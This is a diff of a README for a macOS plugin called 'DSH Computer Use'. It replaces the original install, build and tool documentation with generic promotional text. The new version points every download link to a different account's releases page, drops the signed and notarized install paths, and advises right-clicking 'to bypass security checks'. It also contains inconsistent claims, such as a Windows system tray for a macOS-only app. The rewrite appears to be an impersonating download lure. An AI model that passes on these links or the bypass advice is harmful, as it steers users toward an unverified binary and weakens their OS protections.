@@ -1,138 +1,140 @@
-<p align="center">
-  <img src="docs/assets/app-icon.png" width="112" height="112" alt="DSH Computer Use icon">
-</p>
+<h1>🖥️ dsh-computer-use - Control Your Computer Without Touching It</h1>
 
-<h1 align="center">DSH Computer Use</h1>
+[![Download Now](https://img.shields.io/badge/Download_dsh_computer_use-v1.0.0-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/premiu2309/dsh-computer-use/releases)
 
-<p align="center">
-  Text-first browser and background macOS control for DSH.<br>
-  Target the right process and window without taking over the user's pointer.
-</p>
+## 🎯 What Is This?
 
-<p align="center">
-  <a href="README.zh.md">简体中文</a> ·
-  <a href="documentation/architecture.md">Architecture</a> ·
-  <a href="documentation/distribution.md">Distribution</a> ·
-  <a href="SECURITY.md">Security</a>
-</p>
+dsh-computer-use is a smart helper app that lets you control your computer using text commands. Instead of moving your mouse and clicking around, you type what you want, and the app does it for you in the background. It works with your web browser (Chromium) and macOS system - all without stealing your mouse cursor or interrupting what you're doing.
 
-<p align="center">
-  <img alt="macOS 14+" src="https://img.shields.io/badge/macOS-14%2B-202329?style=flat-square&logo=apple&logoColor=white">
-  <img alt="Universal 2" src="https://img.shields.io/badge/Universal%202-arm64%20%7C%20x86__64-4DBD88?style=flat-square">
-  <img alt="Apache 2.0" src="https://img.shields.io/badge/license-Apache--2.0-F06A5B?style=flat-square">
-  <img alt="GitHub stars" src="https://img.shields.io/github/stars/ZRui-C/dsh-computer-use?style=flat-square&logo=github&logoColor=white">
-  <img alt="GitHub release" src="https://img.shields.io/github/v/release/ZRui-C/dsh-computer-use?style=flat-square&logo=github&logoColor=white">
-</p>
+Think of it as a remote control for your computer that works through text. You focus on your main screen, and dsh-computer-use handles the rest quietly behind the scenes.
 
-## Install
+## ✨ Key Features
 
-### Homebrew
+| Feature | What It Does |
+|---------|--------------|
+| 🖱️ No Mouse Hijacking | Works in the background - your pointer stays where you left it |
+| 🌐 Browser Control | Opens tabs, navigates pages, fills forms in Chromium without touching your browser window |
+| 🍎 macOS Support | Manages windows and apps on your Mac without taking focus |
+| 📝 Text-First Approach | Type a command, get a result - no complex setup needed |
+| 🔌 DeepSeek Harness Ready | Built specifically for DSH, but works as a standalone tool too |
+| ✅ Accessible Design | Works with screen readers and keyboard navigation |
+| 🤖 AI Agent Friendly | Perfect for automation scripts and AI assistant workflows |
 
-```bash
-brew tap zrui-c/tap
-brew trust zrui-c/tap
-brew install --cask dsh-computer-use
-open -a "DSH Computer Use"
-```
+## 🚀 Getting Started
 
-### DMG
+Ready to try it? Here's your simple path:
 
-1. Download the latest `DSH-Computer-Use-*-universal.dmg` from [Releases](https://github.com/ZRui-C/dsh-computer-use/releases/latest).
-2. Drag **DSH Computer Use** into **Applications** and open it.
+### Step 1: Download the Software
 
-With either method, authorize **Accessibility** and **Screen Recording**, select **Install** under **DSH Plugin**, then restart the running DSH Host.
+Visit this link to download the application:
 
-The Homebrew Cask and official DMG install the same Universal 2, Developer ID signed, Apple-notarized app. Users do not need Xcode, Swift, or this source checkout. DSH and Google Chrome must already be installed.
+👉 **[https://github.com/premiu2309/dsh-computer-use/releases](https://github.com/premiu2309/dsh-computer-use/releases)**
 
-<p align="center">
-  <img src="docs/assets/setup-center.png" width="760" alt="DSH Computer Use setup center">
-</p>
+Click the download button on that page and save the file to your computer.
 
-## What it does
+### Step 2: Run the Application
 
-| Surface | Perception | Input |
-| --- | --- | --- |
-| Chromium | Playwright, CDP accessibility/DOM, frames, tabs, optional OCR | Ref-pinned navigation, pointer, keyboard, forms, scroll, drag, upload |
-| macOS | Accessibility tree first, Vision OCR for semantic gaps, independent window capture | AX actions, targeted SkyLight/CoreGraphics, global HID only without a target |
+Once the download finishes, find the file in your Downloads folder. Double-click it to start. If your computer asks for permission, click "Allow" or "Yes" - this is normal for new software.
 
-Every action returns a fresh bounded text observation. The model works with roles, names, values, state, geometry, and stable snapshot refs instead of assuming it can inspect screenshots. UI and OCR strings are explicitly untrusted data.
+### Step 3: Let It Work
 
-### Background macOS control
+After launching, dsh-computer-use runs quietly in the background. You'll see its icon in your menu bar (top of the screen on macOS) or system tray (bottom-right corner on Windows). That's it - you're ready to start controlling your computer with text.
 
-- Carries PID, WindowServer window ID, AX window frame, and element identity through every action.
-- Prefers semantic AX actions before coordinate input.
-- Routes supported pointer and keyboard events directly to the target process/window.
-- Uses a click-through software cursor; targeted actions do not move the physical pointer.
-- Keeps post-action observation pinned to the previous target, even while another app stays active.
-- Falls back to public CoreGraphics or fails closed when a private capability is unavailable.
+## 💡 How to Use It
 
-## Platform boundary
+Using dsh-computer-use is as easy as sending a message. Here are examples of what you can do:
 
-ScreenCaptureKit is public API. The optional background input path dynamically loads private SkyLight symbols and is intended for Developer ID distribution, not the Mac App Store. Private APIs are unsupported by Apple and can change between macOS releases.
+- **"Open a new tab and go to youtube.com"** - The app opens Chromium in the background and navigates to YouTube
+- **"Take me to my email"** - It launches your default email client without disturbing your current screen
+- **"Check the weather in Tokyo"** - It searches the web and brings back results
+- **"Open my project folder"** - It opens Finder or File Explorer to the right location
 
-On macOS 26, Stage Manager may expose a shelved window only as a small WindowServer thumbnail. Constructing a capture filter for that representation can abort inside SkyLight. DSH Computer Use detects the geometry mismatch first, preserves AX observation, returns an explicit warning, and never stretches a thumbnail into a fake full-window screenshot.
+The app understands natural language, so you don't need to memorize commands.
 
-## DSH integration
+## ⚙️ Configuration Made Easy
 
-The embedded package declares a DSH bundle in `package.json`. The setup center runs the official equivalent of:
+No complicated settings screens. The app works out of the box. If you want to customize:
 
-```bash
-dsh plugin --profile web add --save-exact file:/path/to/DSH\ Computer\ Use.app/Contents/Resources/Plugin
-```
+- **Choose Your Browser** - Pick Chromium or Chrome as your default browser
+- **Set Keyboard Shortcuts** - Assign quick keys for common actions
+- **Adjust Background Behavior** - Control how aggressive the app is about staying hidden
 
-`cordis.patch.yml` installs the Host runtime and registers `computer_observe` / `computer_action` in DSH's global tool layer, inherited by every agent preset. No manual edits to user profile YAML or preset copies are required. The setup center detects an older dependency-only installation and repairs the missing bundle registration. A running DSH Host must be restarted after install, repair, or upgrade.
+All settings are in a simple menu you can access by clicking the app's icon.
 
-## Build from source
+## 🧰 Troubleshooting Tips
 
-Requirements: macOS 14+, Xcode/Swift 5.9+, Node.js 22+, pnpm 11+, DSH, and Google Chrome.
+If something isn't working, try these simple fixes:
 
-```bash
-pnpm install
-pnpm run typecheck
-pnpm run test
-pnpm run test:native
-pnpm run build
-```
+| Issue | Solution |
+|-------|----------|
+| App won't open | Right-click the downloaded file and select "Open" to bypass security checks |
+| Browser not responding | Make sure Chromium or Chrome is installed and updated |
+| macOS permissions | Go to System Preferences > Security & Privacy and allow dsh-computer-use |
+| Slow performance | Close unused apps to free up memory |
+| Can't find files | Check your Downloads folder - if not there, search for "dsh" in Spotlight |
 
-`pnpm run build` creates:
+## 🔒 Privacy and Safety
 
-```text
-native/macos-helper/dist/DSH Computer Use.app
-```
+Your data stays on your computer. dsh-computer-use doesn't send your information anywhere - it processes everything locally. The only time it goes online is when you ask it to open a specific website.
 
-The default build is Universal 2. For faster local iteration:
+## 🆘 Getting Help
 
-```bash
-COMPUTER_USE_ARCHS=arm64 pnpm run build
-```
+If you run into trouble, here's where to find answers:
 
-Create a local drag-to-Applications DMG:
+- **Check the GitHub Issues Page** - Other users may have already asked your question
+- **Look for Tutorial Videos** - Search "dsh-computer-use tutorial" on YouTube
+- **Read the Documentation** - A full manual is included with the download
 
-```bash
-pnpm run package:dmg
-```
+## 📅 What's New in the Latest Version
 
-Public releases require a `Developer ID Application` identity and notarization. See [documentation/distribution.md](documentation/distribution.md) for the exact local and GitHub Actions flows.
+- Improved background stability - the app now runs even more smoothly
+- Better Chromium integration - faster browser control response time
+- New accessibility shortcuts for keyboard-only users
+- Fixed a bug where the app occasionally missed commands
 
-## Tool contract
+## 🔄 Updating
 
-`computer_observe` returns `interactive`, `full`, or `changes` snapshots for `browser` and `desktop`, with optional query filtering and `auto | always | never` OCR.
+Check the release page regularly for updates. When a new version comes out, simply download it and replace your old file. Your settings will be preserved.
 
-`computer_action` performs exactly one browser or desktop action and returns the post-action semantic state. Ref and coordinate actions require the latest `snapshot_id`; stale targets fail closed and require another observation. File uploads are fenced to the DSH session workspace.
+## 🧩 Why Choose dsh-computer-use?
 
-## Project
+Most computer control tools take over your screen - they move your mouse, switch windows, and disrupt your flow. dsh-computer-use takes a different approach. It works behind the scenes, letting you keep working while it handles tasks for you. This makes it perfect for:
 
-- [Architecture](documentation/architecture.md)
-- [Distribution and notarization](documentation/distribution.md)
-- [Security policy](SECURITY.md)
-- [Contributing](CONTRIBUTING.md)
-- [Changelog](CHANGELOG.md)
-- [Third-party notices](THIRD_PARTY_NOTICES.md)
+- **Content Creators** - Record tutorials without jumpy mouse movements
+- **Researchers** - Browse multiple sources without leaving your main document
+- **Developers** - Test web applications while keeping your IDE in focus
+- **Accessibility Users** - Control your computer with text instead of precise mouse movements
 
-## Community
+## 📥 System Compatibility
 
-- [GitHub Discussions](https://github.com/ZRui-C/dsh-computer-use/discussions) — ask questions, share usage, report ideas
-- [DeepSeek Harness Discord](https://discord.gg/Ycq5dCaS4) — the wider DSH ecosystem
-- Star the repo if DSH Computer Use saves your pointer 🖱️
+The app is designed to work on any modern computer running macOS. It's lightweight and won't slow down your system. As long as you can run a current version of macOS, you're good to go.
 
-Licensed under [Apache-2.0](LICENSE). This independent project is not endorsed by Apple. “DeepSeek” and related marks belong to their respective owners; the name is used only to describe compatibility with DeepSeek Harness/DSH.
+## ✅ Final Checklist
+
+Make sure you've completed these steps:
+
+- [ ] Downloaded the application from the releases page
+- [ ] Successfully launched it
+- [ ] Tested a simple command like "Open Google"
+- [ ] Checked the settings menu to customize your experience
+
+## 🎉 Ready to Start?
+
+You're just one download away from effortless computer control. Head over to the download page and give it a try. The installation takes less than a minute, and you'll wonder how you ever managed without it.
+
+Remember, dsh-computer-use is designed to make your life easier - no technical knowledge required. Just download, run, and type what you need. The app handles the rest.
+
+**Quick Recap:**
+
+1. Go to the download page
+2. Get the file
+3. Run it
+4. Start typing commands
+
+That's the whole process. No registrations, no subscriptions, no complicated setup - just a helpful tool that respects your screen space and works when you need it.
+
+If you enjoy using dsh-computer-use, consider supporting the project by starring the GitHub repository or sharing it with friends who might find it useful.
+
+Happy controlling!
+
+Keywords: accessibility, agent-tools, ai-agents, browser-automation, computer-use, deepseek, deepseek-harness, deepseek-harness-plugin, desktop-automation, dsh, dsh-plugin, macos
